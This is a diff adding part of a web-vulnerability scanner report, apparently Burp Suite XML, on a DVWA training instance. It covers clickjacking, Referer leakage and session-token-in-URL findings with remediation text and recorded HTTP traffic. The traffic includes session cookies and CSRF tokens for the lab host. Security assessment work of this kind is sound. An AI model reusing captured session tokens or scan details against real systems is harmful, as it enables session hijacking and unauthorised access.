+<li onclick="window.location='../../vulnerabilities/captcha/'" class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli/'" class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli_blind/'" class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='../../vulnerabilities/weak_id/'" class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_d/'" class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_r/'" class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_s/'" class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../security.php'" class=""><a href="../../security.php">DVWA Security</a></li>
+<li onclick="window.location='../../phpinfo.php'" class=""><a href="../../phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='../../about.php'" class=""><a href="../../about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../logout.php'" class=""><a href="../../logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Vulnerability: File Inclusion</h1>
+
+	
+
+	<div class="vulnerable_code_area">
+		[<em><a href="?page=file1.php">file1.php</a></em>] - [<em><a href="?page=file2.php">file2.php</a></em>] - [<em><a href="?page=file3.php">file3.php</a></em>]
+	</div>
+
+	<h2>More Information</h2>
+	<ul>
+		<li><a href="https://en.wikipedia.org/wiki/Remote_File_Inclusion" target="_blank">https://en.wikipedia.org/wiki/Remote_File_Inclusion</a></li>
+		<li><a href="https://www.owasp.org/index.php/Top_10_2007-A3" target="_blank">https://www.owasp.org/index.php/Top_10_2007-A3</a></li>
+	</ul>
+</div>
+
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<input type="button" value="View Help" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_help.php?id=fi&security=impossible' )"> <input type="button" value="View Source" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_source.php?id=fi&security=impossible' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>8283119258835562496</serialNumber>
+    <type>5245344</type>
+    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/vulnerabilities/fi/]]></path>
+    <location><![CDATA[/vulnerabilities/fi/]]></location>
+    <severity>Information</severity>
+    <confidence>Firm</confidence>
+    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
+<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
+<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
+    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /vulnerabilities/fi/?page=include.php HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/xss_r/?name=test&user_token=8475a051467bd615a51166f2fcf38ff5
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 4681
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:23:15 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='../../.'" class=""><a href="../../.">Home</a></li>
+<li onclick="window.location='../../instructions.php'" class=""><a href="../../instructions.php">Instructions</a></li>
+<li onclick="window.location='../../setup.php'" class=""><a href="../../setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../vulnerabilities/brute/'" class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='../../vulnerabilities/exec/'" class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/csrf/'" class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='../../vulnerabilities/fi/.?page=include.php'" class="selected"><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='../../vulnerabilities/upload/'" class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
+<li onclick="window.location='../../vulnerabilities/captcha/'" class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli/'" class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli_blind/'" class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='../../vulnerabilities/weak_id/'" class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_d/'" class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_r/'" class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_s/'" class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../security.php'" class=""><a href="../../security.php">DVWA Security</a></li>
+<li onclick="window.location='../../phpinfo.php'" class=""><a href="../../phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='../../about.php'" class=""><a href="../../about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../logout.php'" class=""><a href="../../logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Vulnerability: File Inclusion</h1>
+
+	
+
+	<div class="vulnerable_code_area">
+		[<em><a href="?page=file1.php">file1.php</a></em>] - [<em><a href="?page=file2.php">file2.php</a></em>] - [<em><a href="?page=file3.php">file3.php</a></em>]
+	</div>
+
+	<h2>More Information</h2>
+	<ul>
+		<li><a href="https://en.wikipedia.org/wiki/Remote_File_Inclusion" target="_blank">https://en.wikipedia.org/wiki/Remote_File_Inclusion</a></li>
+		<li><a href="https://www.owasp.org/index.php/Top_10_2007-A3" target="_blank">https://www.owasp.org/index.php/Top_10_2007-A3</a></li>
+	</ul>
+</div>
+
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<input type="button" value="View Help" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_help.php?id=fi&security=impossible' )"> <input type="button" value="View Source" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_source.php?id=fi&security=impossible' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>3646436007762257920</serialNumber>
+    <type>5243904</type>
+    <name><![CDATA[Cross-domain Referer leakage]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/vulnerabilities/xss_r/]]></path>
+    <location><![CDATA[/vulnerabilities/xss_r/]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the "Referer" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>
+<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>
+<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>
+<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>
+<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties. If placing sensitive information in the URL is unavoidable, consider using the Referer-Policy HTTP header to reduce the chance of it being disclosed to third parties.
+</p>]]></remediationBackground>
+    <references><![CDATA[<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy">Referer Policy</a></li>
+</ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The page was loaded from a URL containing a query string:<ul><li>http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/xss_r/</li></ul>The response contains the following links to other domains:<ul><li>https://en.wikipedia.org/wiki/Cross-site_scripting</li><li>http://www.cgisecurity.com/xss-faq.html</li><li>https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</li><li>https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</li><li>http://www.scriptalert1.com/</li></ul>]]></issueDetail>
+    <issueDetailItems>
+      <issueDetailItem><![CDATA[https://en.wikipedia.org/wiki/Cross-site_scripting]]></issueDetailItem>
+      <issueDetailItem><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></issueDetailItem>
+      <issueDetailItem><![CDATA[https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)]]></issueDetailItem>
+      <issueDetailItem><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></issueDetailItem>
+      <issueDetailItem><![CDATA[http://www.scriptalert1.com/]]></issueDetailItem>
+    </issueDetailItems>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /vulnerabilities/xss_r/?name=test&user_token=8475a051467bd615a51166f2fcf38ff5 HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/xss_r/
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 5264
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:22:18 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='../../.'" class=""><a href="../../.">Home</a></li>
+<li onclick="window.location='../../instructions.php'" class=""><a href="../../instructions.php">Instructions</a></li>
+<li onclick="window.location='../../setup.php'" class=""><a href="../../setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../vulnerabilities/brute/'" class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='../../vulnerabilities/exec/'" class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/csrf/'" class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='../../vulnerabilities/fi/.?page=include.php'" class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='../../vulnerabilities/upload/'" class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
+<li onclick="window.location='../../vulnerabilities/captcha/'" class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli/'" class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli_blind/'" class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='../../vulnerabilities/weak_id/'" class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_d/'" class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_r/'" class="selected"><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_s/'" class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../security.php'" class=""><a href="../../security.php">DVWA Security</a></li>
+<li onclick="window.location='../../phpinfo.php'" class=""><a href="../../phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='../../about.php'" class=""><a href="../../about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../logout.php'" class=""><a href="../../logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Vulnerability: Reflected Cross Site Scripting (XSS)</h1>
+
+	<div class="vulnerable_code_area">
+		<form name="XSS" action="#" method="GET">
+			<p>
+				What's your name?
+				<input type="text" name="name">
+				<input type="submit" value="Submit">
+			</p>
+			<input type='hidden' name='user_token' value='2b26870fdcb2947832a7f034059b55fb' />
+		</form>
+		<pre>Hello test</pre>
+	</div>
+
+	<h2>More Information</h2>
+	<ul>
+		<li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></li>
+		<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></li>
+		<li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank">https://en.wikipedia.org/wiki/Cross-site_scripting</a></li>
+		<li><a href="http://www.cgisecurity.com/xss-faq.html" target="_blank">http://www.cgisecurity.com/xss-faq.html</a></li>
+		<li><a href="http://www.scriptalert1.com/" target="_blank">http://www.scriptalert1.com/</a></li>
+	</ul>
+</div>
+
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<input type="button" value="View Help" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_help.php?id=xss_r&security=impossible' )"> <input type="button" value="View Source" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_source.php?id=xss_r&security=impossible' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>7629224459192045568</serialNumber>
+    <type>5244672</type>
+    <name><![CDATA[Session token in URL]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/vulnerabilities/xss_r/]]></path>
+    <location><![CDATA[/vulnerabilities/xss_r/]]></location>
+    <severity>Medium</severity>
+    <confidence>Firm</confidence>
+    <issueBackground><![CDATA[<p>Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing session tokens into the URL increases the risk that they will be captured by an attacker.</p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>Applications should use an alternative mechanism for transmitting session tokens, such as HTTP cookies or hidden fields in forms that are submitted using the POST method.</p>]]></remediationBackground>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/384.html">CWE-384: Session Fixation</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/598.html">CWE-598: Information Exposure Through Query Strings in GET Request</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The URL in the request appears to contain a session token within the query string:<ul><li>http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/xss_r/?name=test&amp;user_token=8475a051467bd615a51166f2fcf38ff5</li></ul>]]></issueDetail>
+    <issueDetailItems>
+      <issueDetailItem><![CDATA[http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/xss_r/?name=test&user_token=8475a051467bd615a51166f2fcf38ff5]]></issueDetailItem>
+    </issueDetailItems>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /vulnerabilities/xss_r/?name=test&user_token=8475a051467bd615a51166f2fcf38ff5 HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/xss_r/
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 5264
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:22:18 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='../../.'" class=""><a href="../../.">Home</a></li>
+<li onclick="window.location='../../instructions.php'" class=""><a href="../../instructions.php">Instructions</a></li>
+<li onclick="window.location='../../setup.php'" class=""><a href="../../setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../vulnerabilities/brute/'" class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='../../vulnerabilities/exec/'" class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/csrf/'" class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='../../vulnerabilities/fi/.?page=include.php'" class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='../../vulnerabilities/upload/'" class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
+<li onclick="window.location='../../vulnerabilities/captcha/'" class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli/'" class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli_blind/'" class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='../../vulnerabilities/weak_id/'" class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_d/'" class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_r/'" class="selected"><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_s/'" class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../security.php'" class=""><a href="../../security.php">DVWA Security</a></li>
+<li onclick="window.location='../../phpinfo.php'" class=""><a href="../../phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='../../about.php'" class=""><a href="../../about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../logout.php'" class=""><a href="../../logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Vulnerability: Reflected Cross Site Scripting (XSS)</h1>
+
+	<div class="vulnerable_code_area">
+		<form name="XSS" action="#" method="GET">
+			<p>
+				What's your name?
+				<input type="text" name="name">
+				<input type="submit" value="Submit">
+			</p>
+			<input type='hidden' name='user_token' value='2b26870fdcb2947832a7f034059b55fb' />
+		</form>
+		<pre>Hello test</pre>
+	</div>
+
+	<h2>More Information</h2>
+	<ul>
+		<li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></li>
+		<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></li>
+		<li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank">https://en.wikipedia.org/wiki/Cross-site_scripting</a></li>
+		<li><a href="http://www.cgisecurity.com/xss-faq.html" target="_blank">http://www.cgisecurity.com/xss-faq.html</a></li>
+		<li><a href="http://www.scriptalert1.com/" target="_blank">http://www.scriptalert1.com/</a></li>
+	</ul>
+</div>
+
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<input type="button" value="View Help" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_help.php?id=xss_r&security=impossible' )"> <input type="button" value="View Source" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_source.php?id=xss_r&security=impossible' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>4155964302395892736</serialNumber>
+    <type>5245344</type>
+    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/vulnerabilities/xss_r/]]></path>
+    <location><![CDATA[/vulnerabilities/xss_r/]]></location>
+    <severity>Information</severity>
+    <confidence>Firm</confidence>
+    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
+<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
+<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
+    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
+</ul>]]></vulnerabilityClassifications>
